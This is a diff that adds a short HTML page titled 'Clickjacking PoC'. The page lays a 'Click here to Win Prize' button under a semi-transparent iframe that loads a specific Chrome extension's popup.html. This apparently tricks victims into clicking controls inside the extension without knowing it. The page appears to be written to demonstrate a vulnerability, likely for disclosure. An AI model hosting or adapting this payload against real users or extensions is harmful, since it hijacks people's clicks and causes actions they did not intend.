@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC</title>
+</head>
+<body>
+<input type=button value="Click here to Win Prize" style="z-index:-1;left:1000px;position:relative;top:500px;"/>
+<iframe src="chrome-extension://kojjmcjdddpejfijcjbbkoolpdbjjmfk/popup.html" width="1000" height="450" style=”opacity: 0.5;”></iframe>
+</body>
+</html>
